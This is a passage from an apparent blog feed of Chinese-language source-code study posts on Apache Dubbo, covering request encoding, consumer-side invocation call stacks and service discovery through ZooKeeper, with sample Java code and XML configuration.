attachments={path=com.code260.ss.dubbo.demov.facade.service.UserService, interface=com.code260.ss.dubbo.demov.facade.service.UserService, version=0.0.0, timeout=600000, token=123456}]</p></blockquote><p>整个逻辑是先写入一些特殊字段比如version,path，methodName等，再挨个写入请求参数，参数会过一层处理主要是针对回调的，如果不是回调方式的，原样返回给编码器进行序列化即可。</p><p>这个方法入参out的class是com.alibaba.dubbo.common.serialize.support.hessian.Hessian2ObjectOutput。 </p><h3 id="附上部分代码及调用栈供你参考"><a href="#附上部分代码及调用栈供你参考" class="headerlink" title="附上部分代码及调用栈供你参考"></a>附上部分代码及调用栈供你参考</h3><p>调用栈：  </p><pre><code class="hljs java">DubboCodec.encodeRequestData(Channel, ObjectOutput, Object) line: <span class="hljs-number">186</span>DubboCodec(ExchangeCodec).encodeRequest(Channel, ChannelBuffer, Request) line: <span class="hljs-number">236</span>DubboCodec(ExchangeCodec).encode(Channel, ChannelBuffer, Object) line: <span class="hljs-number">75</span>DubboCountCodec.encode(Channel, ChannelBuffer, Object) line: <span class="hljs-number">39</span>NettyCodecAdapter$InternalEncoder.encode(ChannelHandlerContext, Channel, Object) line: <span class="hljs-number">81</span>NettyCodecAdapter$InternalEncoder(OneToOneEncoder).handleDownstream(ChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">66</span>DefaultChannelPipeline.sendDownstream(DefaultChannelPipeline$DefaultChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">591</span>DefaultChannelPipeline$DefaultChannelHandlerContext.sendDownstream(ChannelEvent) line: <span class="hljs-number">776</span>NettyHandler(SimpleChannelHandler).writeRequested(ChannelHandlerContext, MessageEvent) line: <span class="hljs-number">304</span>NettyHandler.writeRequested(ChannelHandlerContext, MessageEvent) line: <span class="hljs-number">99</span>NettyHandler(SimpleChannelHandler).handleDownstream(ChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">266</span>DefaultChannelPipeline.sendDownstream(DefaultChannelPipeline$DefaultChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">591</span>DefaultChannelPipeline.sendDownstream(ChannelEvent) line: <span class="hljs-number">582</span>Channels.write(Channel, Object, SocketAddress) line: <span class="hljs-number">611</span>Channels.write(Channel, Object) line: <span class="hljs-number">578</span>NioClientSocketChannel(AbstractChannel).write(Object) line: <span class="hljs-number">251</span>NettyChannel.send(Object, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">98</span>NettyClient(AbstractClient).send(Object, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">270</span>NettyClient(AbstractPeer).send(Object) line: <span class="hljs-number">51</span>HeaderExchangeChannel.request(Object, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">112</span>HeaderExchangeClient.request(Object, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">91</span></code></pre><p>编码请求的代码：</p><pre><code class="hljs java">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">encodeRequest</span><span class="hljs-params">(Channel channel, ChannelBuffer buffer, Request req)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;        Serialization serialization = getSerialization(channel);        <span class="hljs-comment">// header.</span>        <span class="hljs-keyword">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[HEADER_LENGTH];        <span class="hljs-comment">// set magic number.</span>        Bytes.short2bytes(MAGIC, header);        <span class="hljs-comment">// set request and serialization flag.</span>        header[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">byte</span>) (FLAG_REQUEST | serialization.getContentTypeId());        <span class="hljs-keyword">if</span> (req.isTwoWay()) header[<span class="hljs-number">2</span>] |= FLAG_TWOWAY;        <span class="hljs-keyword">if</span> (req.isEvent()) header[<span class="hljs-number">2</span>] |= FLAG_EVENT;        <span class="hljs-comment">// set request id.</span>        Bytes.long2bytes(req.getId(), header, <span class="hljs-number">4</span>);        <span class="hljs-comment">// encode request data.</span>        <span class="hljs-keyword">int</span> savedWriteIndex = buffer.writerIndex();        buffer.writerIndex(savedWriteIndex + HEADER_LENGTH);        ChannelBufferOutputStream bos = <span class="hljs-keyword">new</span> ChannelBufferOutputStream(buffer);        ObjectOutput out = serialization.serialize(channel.getUrl(), bos);        <span class="hljs-keyword">if</span> (req.isEvent()) &#123;            encodeEventData(channel, out, req.getData());        &#125; <span class="hljs-keyword">else</span> &#123;            encodeRequestData(channel, out, req.getData());        &#125;        out.flushBuffer();        bos.flush();        bos.close();        <span class="hljs-keyword">int</span> len = bos.writtenBytes();        checkPayload(channel, len);        Bytes.int2bytes(len, header, <span class="hljs-number">12</span>);        <span class="hljs-comment">// write</span>        buffer.writerIndex(savedWriteIndex);        buffer.writeBytes(header); <span class="hljs-comment">// write header.</span>        buffer.writerIndex(savedWriteIndex + HEADER_LENGTH + len);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">encodeRequestData</span><span class="hljs-params">(Channel channel, ObjectOutput out, Object data)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;        RpcInvocation inv = (RpcInvocation) data;        out.writeUTF(inv.getAttachment(Constants.DUBBO_VERSION_KEY, DUBBO_VERSION));        out.writeUTF(inv.getAttachment(Constants.PATH_KEY));        out.writeUTF(inv.getAttachment(Constants.VERSION_KEY));        out.writeUTF(inv.getMethodName());        out.writeUTF(ReflectUtils.getDesc(inv.getParameterTypes()));        Object[] args = inv.getArguments();        <span class="hljs-keyword">if</span> (args != <span class="hljs-keyword">null</span>)        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; args.length; i++)&#123;            out.writeObject(encodeInvocationArgument(channel, inv, i));        &#125;        out.writeObject(inv.getAttachments());    &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]10.发现到服务之后如何玩转调用的最简过程</title>
    <link href="/2020/05/30/dubbo-10.how-invoke-service-after-found/"/>
    <url>/2020/05/30/dubbo-10.how-invoke-service-after-found/</url>
    
    <content type="html"><![CDATA[<h2 id="10-发现到服务之后如何玩转调用的最简过程"><a href="#10-发现到服务之后如何玩转调用的最简过程" class="headerlink" title="10.发现到服务之后如何玩转调用的最简过程"></a>10.发现到服务之后如何玩转调用的最简过程</h2><p>上一篇文章中讲述了消费这么找到服务，怎么为后面的调用准备client与invoker。  </p><p>这篇我们探讨下，当一个rpc服务真正发起调用时是怎样的，经历那些过程。  </p><p>我们先截取一段服务发起调用时的调用栈，在截取调用栈之前我们先准备一个用例，有返回值的rpc调用，后面文章也会用到。</p><h3 id="相关case代码"><a href="#相关case代码" class="headerlink" title="相关case代码"></a>相关case代码</h3><p>facade端的接口:  </p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.facade.service;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.bean.User;<span class="hljs-comment">/**</span><span class="hljs-comment"> * &lt;一句话功能简述&gt;</span><span class="hljs-comment"> * &lt;功能详细描述&gt;</span><span class="hljs-comment"> * </span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>  chen.simon</span><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>  [版本号, 2016-9-6]</span><span class="hljs-comment"> * <span class="hljs-doctag">@see</span>  [相关类/方法]</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span>  [产品/模块版本]</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(Integer id)</span></span>;&#125;</code></pre><p>server端的实现：  </p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.server.service.impl;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.bean.Team;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.bean.User;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.service.UserService;<span class="hljs-comment">/**</span><span class="hljs-comment"> * &lt;一句话功能简述&gt;</span><span class="hljs-comment"> * &lt;功能详细描述&gt;</span><span class="hljs-comment"> * </span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>  chen.simon</span><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>  [版本号, 2016-9-7]</span><span class="hljs-comment"> * <span class="hljs-doctag">@see</span>  [相关类/方法]</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span>  [产品/模块版本]</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span></span><span class="hljs-class"></span>&#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> id</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(Integer id)</span></span><span class="hljs-function">    </span>&#123;        User u = <span class="hljs-keyword">new</span> User();        u.setId(id);        StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer();        String line = <span class="hljs-string">"aabbccddeeffgghhjji\n"</span>;        <span class="hljs-keyword">int</span> bodysize = <span class="hljs-number">1</span> * <span class="hljs-number">10</span> * <span class="hljs-number">7</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt;  bodysize / (line.length()); i++)&#123;            sb.append(line);        &#125;        u.setName(sb.toString());        Team team = <span class="hljs-keyword">new</span> Team();        team.setId(<span class="hljs-number">100</span>);        team.setName(<span class="hljs-string">"xx office"</span>);        u.setTeam(team);        System.out.println(<span class="hljs-string">"Query user--"</span> + id +<span class="hljs-string">"@"</span> + <span class="hljs-keyword">new</span> Date());        <span class="hljs-keyword">return</span> u;    &#125;&#125;</code></pre><p>server端的node启动还是跟HelloService的公用：  </p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.server.registercenter.zookeeper;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.junit.runner.RunWith;<span class="hljs-keyword">import</span> org.springframework.test.context.ContextConfiguration;<span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;<span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/server/conf/registercenter/zookeeper/applicationContextNode1.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServiceTestNode1</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">try</span>        &#123;            System.out.println(<span class="hljs-string">"zookeeper注册中心demo：I am node1:-)"</span>);            System.in.read();        &#125;        <span class="hljs-keyword">catch</span> (IOException e)        &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>server端的provider配置：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.UserService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"accesslog"</span> </span><span class="hljs-tag">    <span class="hljs-attr">timeout</span>=<span class="hljs-string">"600000"</span> <span class="hljs-attr">token</span>=<span class="hljs-string">"123456"</span>  <span class="hljs-attr">connections</span>=<span class="hljs-string">"10"</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"accesslog"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.server.service.impl.UserServiceImpl"</span> /&gt;</span></code></pre><p>client端的test case：</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.client.registercenter.zookeeper;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.junit.runner.RunWith;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.test.context.ContextConfiguration;<span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.bean.User;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.service.UserService;<span class="hljs-comment">/**</span><span class="hljs-comment"> * &lt;一句话功能简述&gt; &lt;功能详细描述&gt;</span><span class="hljs-comment"> * </span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Chenxiaguang</span><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> [版本号, 2015-8-12]</span><span class="hljs-comment"> * <span class="hljs-doctag">@see</span> [相关类/方法]</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> [产品/模块版本]</span><span class="hljs-comment"> */</span><span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/client/conf/registercenter/zookeeper/applicationContext.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserClientTest</span></span><span class="hljs-class"></span>&#123;        <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> UserService userService;        <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testQueryUser</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        User user = userService.queryUser(<span class="hljs-number">100</span>);        System.out.println(user.getName());    &#125;&#125;</code></pre><p>Client端的consumer配置：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.UserService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"cache,validation,deprecated,compatible"</span> &gt;</span>    <span class="hljs-comment">&lt;!-- 能支持的全部cache定义在META-INF/dubbo/internal/com.alibaba.dubbo.cache.CacheFactory 当然你也可以遵循dubbo扩展点机制进行扩展。 --&gt;</span>    <span class="hljs-comment">&lt;!-- 何种类型的cache --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"cache"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"lru"</span> /&gt;</span><span class="hljs-comment">&lt;!--     &lt;dubbo:parameter key="validation" value="JValidator"/&gt; --&gt;</span>    <span class="hljs-comment">&lt;!-- 配置一个实现了javax.validation.spi.ValidationProvider&lt;T&gt;接口校验器 --&gt;</span><span class="hljs-comment">&lt;!--     &lt;dubbo:parameter key="jvalidation" value="org.hibernate.validator.HibernateValidator" /&gt;--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"queryUser"</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"deprecated"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:method</span>&gt;</span><span class="hljs-comment">&lt;!--      &lt;dubbo:parameter key="token" value="123456" /&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><h3 id="服务发起调用时的调用栈"><a href="#服务发起调用时的调用栈" class="headerlink" title="服务发起调用时的调用栈"></a>服务发起调用时的调用栈</h3><pre><code class="hljs java">HeaderExchangeChannel.request(Object, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">112</span>HeaderExchangeClient.request(Object, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">91</span>DubboInvoker&lt;T&gt;.doInvoke(Invocation) line: <span class="hljs-number">96</span>DubboInvoker&lt;T&gt;(AbstractInvoker&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">144</span>CompatibleFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">43</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>DeprecatedFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">51</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>ValidationFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">57</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>CacheFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">55</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>MonitorFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">75</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>FutureFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">53</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>ConsumerContextFilter.invoke(Invoker&lt;?&gt;, Invocation) line: <span class="hljs-number">48</span>ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(Invocation) line: <span class="hljs-number">91</span>ListenerInvokerWrapper&lt;T&gt;.invoke(Invocation) line: <span class="hljs-number">74</span>RegistryDirectory$InvokerDelegete&lt;T&gt;(InvokerWrapper&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">53</span>FailoverClusterInvoker&lt;T&gt;.doInvoke(Invocation, List&lt;Invoker&lt;T&gt;&gt;, LoadBalance) line: <span class="hljs-number">77</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">227</span>MockClusterInvoker&lt;T&gt;.invoke(Invocation) line: <span class="hljs-number">72</span>InvokerInvocationHandler.invoke(Object, Method, Object[]) line: <span class="hljs-number">52</span>proxy0.queryUser(Integer) line: not availableUserClientTest.testQueryUser() line: <span class="hljs-number">38</span></code></pre><p>上面的栈展示了从UserClientTest.testQueryUser()这个case调用rpc服务到HeaderExchangeChannel.request请求远端服务的过程栈。  </p><p>请求远端服务的方式是HeaderExchangeChannel.request(Object, int) line: 112，代码如下：  </p><pre><code class="hljs java">channel.send(req);</code></pre><p>这个channel是： </p><blockquote><p>com.alibaba.dubbo.remoting.transport.netty.NettyClient [/192.168.2.3:53474 -&gt; /192.168.2.3:20880]</p></blockquote><p>当然这是有返回值two way的服务调用方式，没有返回值像HelloService那种one way的略有差别。  </p><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><pre><code class="hljs mermaid">graph TDA(1-为consumer服务生成的代理)--&gt;B(2-分布式集群容错调用器)B--&gt;C(3-注册目录服务调用)C--&gt;D(4-调用链上的过滤器)D--&gt;E(5-rpc协议调用器DubboInvoker)E--&gt;F(6-HeaderExchangeClient交换层的client)F--&gt;G(7-网络层的NettyClient发送请求)</code></pre><p>1处的<strong>为consumer服务生成的代理</strong>这个代理的生成过程分析可以参见前面的文章：06.消费者consumer侧 reference bean生成逻辑。   </p><p>2-分布式集群容错调用器 后面文章讲。  </p><p>4-调用链上的过滤器 后面文章讲。  </p><p>此文主要是描述下consumer端发起调用的一个全貌，一个顶层堆栈流程。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]09.消费者如何发现服务</title>
    <link href="/2020/05/30/dubbo-09.how-to-find-service-for-consumer/"/>
    <url>/2020/05/30/dubbo-09.how-to-find-service-for-consumer/</url>
    
    <content type="html"><![CDATA[<h2 id="09-消费者如何发现服务"><a href="#09-消费者如何发现服务" class="headerlink" title="09.消费者如何发现服务"></a>09.消费者如何发现服务</h2><h3 id="到注册中心查找的堆栈"><a href="#到注册中心查找的堆栈" class="headerlink" title="到注册中心查找的堆栈"></a>到注册中心查找的堆栈</h3><p>上一篇文章已经讲到provider会把自己服务监听的ip和端口等信息注册到注册中心。那么，consumer想要调用provider则需要到注册中心查找provider的信息。查找的调用栈是怎么样的呢？  </p><p>先看下查找zk上的path的子节点的调用栈：  </p><pre><code class="hljs java">ZkclientZookeeperClient.addTargetChildListener(String, IZkChildListener) line: <span class="hljs-number">88</span>ZkclientZookeeperClient.addTargetChildListener(String, Object) line: <span class="hljs-number">1</span>ZkclientZookeeperClient(AbstractZookeeperClient&lt;TargetChildListener&gt;).addChildListener(String, ChildListener) line: <span class="hljs-number">71</span>ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: <span class="hljs-number">165</span>ZookeeperRegistry(FailbackRegistry).subscribe(URL, NotifyListener) line: <span class="hljs-number">189</span>RegistryDirectory&lt;T&gt;.subscribe(URL) line: <span class="hljs-number">133</span>RegistryProtocol.doRefer(Cluster, Registry, Class&lt;T&gt;, URL) line: <span class="hljs-number">271</span>RegistryProtocol.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">254</span>ProtocolFilterWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">60</span>ProtocolListenerWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">63</span>Protocol$Adpative.refer(Class, URL) line: not availableReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).createProxy(Map&lt;String,String&gt;) line: <span class="hljs-number">392</span>ReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).init() line: <span class="hljs-number">300</span>ReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).get() line: <span class="hljs-number">138</span>ReferenceBean&lt;T&gt;.getObject() line: <span class="hljs-number">65</span>DefaultListableBeanFactory(FactoryBeanRegistrySupport).doGetObjectFromFactoryBean(FactoryBean&lt;?&gt;, String) line: <span class="hljs-number">168</span></code></pre><p>查阅ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: 165    附近的代码发现，在此通过<strong>给子节点添加监听器同时拿到子节点</strong>的办法查找到了provider端的信息，比如provider端的ip和端口等。  </p><pre><code class="hljs java">List&lt;String&gt; children = zkClient.addChildListener(path, zkListener);<span class="hljs-keyword">if</span> (children != <span class="hljs-keyword">null</span>) &#123;    urls.addAll(toUrlsWithEmpty(url, path, children));&#125;</code></pre><p>此处path是：/dubbo/com.code260.ss.dubbo.demov.facade.service.HelloService/providers  </p><p>此处children是： </p><blockquote><p>[dubbo://192.168.2.3:20880/com.code260.ss.dubbo.demov.facade.service.HelloService?anyhost=true&amp;application=hello-world-app&amp;connections=50&amp;dubbo=2.0.0&amp;interface=com.code260.ss.dubbo.demov.facade.service.HelloService&amp;methods=sayHello&amp;pid=56671&amp;service.filter=tpslimiter&amp;side=provider&amp;timestamp=1590826560961]</p></blockquote><p>为了看的方便，我对其做url解码，实际调试过程中看到的是上面这串字符串经过url编码后的值。    </p><p>通过上述变量值，不难发现，consumer侧已经从zk上查到了provider的信息。    </p><h3 id="查到了provider端的ip与端口等信息后如何使用如何建立consumer端的client"><a href="#查到了provider端的ip与端口等信息后如何使用如何建立consumer端的client" class="headerlink" title="查到了provider端的ip与端口等信息后如何使用如何建立consumer端的client"></a>查到了provider端的ip与端口等信息后如何使用如何建立consumer端的client</h3><p>对于dubbo protocol来讲，要完成服务调用则需要DubboInvoker。DubboInvoker的调用靠ExchangeClient完成请求。那么构建DubboInvoker的ExchangeClient是在其构造函数中，DubboInvoker构造函数的调用栈是：  </p><pre><code class="hljs java">DubboInvoker&lt;T&gt;.&lt;init&gt;(Class&lt;T&gt;, URL, ExchangeClient[], Set&lt;Invoker&lt;?&gt;&gt;) line: <span class="hljs-number">62</span>DubboProtocol.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">303</span>ProtocolFilterWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">62</span>ProtocolListenerWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">65</span>Protocol$Adpative.refer(Class, URL) line: not availableRegistryDirectory&lt;T&gt;.toInvokers(List&lt;URL&gt;) line: <span class="hljs-number">395</span>RegistryDirectory&lt;T&gt;.refreshInvoker(List&lt;URL&gt;) line: <span class="hljs-number">224</span>RegistryDirectory&lt;T&gt;.notify(List&lt;URL&gt;) line: <span class="hljs-number">195</span>ZookeeperRegistry(AbstractRegistry).notify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">449</span>ZookeeperRegistry(FailbackRegistry).doNotify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">273</span>ZookeeperRegistry(FailbackRegistry).notify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">259</span>ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: <span class="hljs-number">170</span></code></pre><p>上面我截取了一部分，开始的地方是ZookeeperRegistry.doSubscribe，也正是到注册中心查找provider的ip和端口等信息的方法，也是其165行查找到结果的后续，170行做notify接上上面的堆栈。</p><pre><code class="hljs java"><span class="hljs-number">164</span>                    zkClient.create(path, <span class="hljs-keyword">false</span>);<span class="hljs-number">165</span>                    List&lt;String&gt; children = zkClient.addChildListener(path, zkListener);<span class="hljs-number">166</span>                    <span class="hljs-keyword">if</span> (children != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-number">167</span>                    urls.addAll(toUrlsWithEmpty(url, path, children));<span class="hljs-number">168</span>                    &#125;<span class="hljs-number">169</span>                &#125;<span class="hljs-number">170</span>               notify(url, listener, urls);</code></pre><p>DubboProtocol.refer(Class<T>, URL) line: 303    中会真正创建ExchangeClient。  </p><p>把上面的堆栈大致画个流程图：  </p><pre><code class="hljs mermaid">graph TDA(RegistryProtocol.doRefer注册协议refer)--&gt;B(RegistryDirectory.subscribe注册目录订阅)B--&gt;C(ZookeeperRegistry.doSubscribe向注册中心添加子路径的监听器同时查询子路径列表即provider侧的信息)C--&gt;D(ZookeeperRegistry.doSubscribe查找到provider信息后ZookeeperRegistry.notify)D--&gt;E(RegistryDirectory.notify&#x2F;refreshInvoker&#x2F;toInvokers)E--&gt;F(创建ExchangeClient实例-创建DubboInvoker实例等)</code></pre><p>再精简一下</p><pre><code class="hljs mermaid">graph LRA(添加监听器并查找)--&gt;B(订阅)--&gt;C(noitfy)--&gt;D(创建client与invoker)</code></pre><p>ReferenceConfig 把proxy建出来了就相当于发现了服务并完成消费端的”client“的创建。建proxy的过程中不仅包括查找到服务在哪里还包括增减监听器，包括创建Dubbo调用者等等…</p><p>创建client的代码：  </p><pre><code class="hljs java">com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.getClients(URL)com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.getSharedClient(URL)com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.initClient(URL)com.alibaba.dubbo.remoting.exchange.Exchangers.connect(URL, ExchangeHandler)</code></pre><p>Exchangers这一层再往下再细节的后面讲。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]08.提供者如何注册服务 如何延迟暴露</title>
    <link href="/2020/05/28/dubbo-08.provider-how-to-register-and-open-server/"/>
    <url>/2020/05/28/dubbo-08.provider-how-to-register-and-open-server/</url>
    
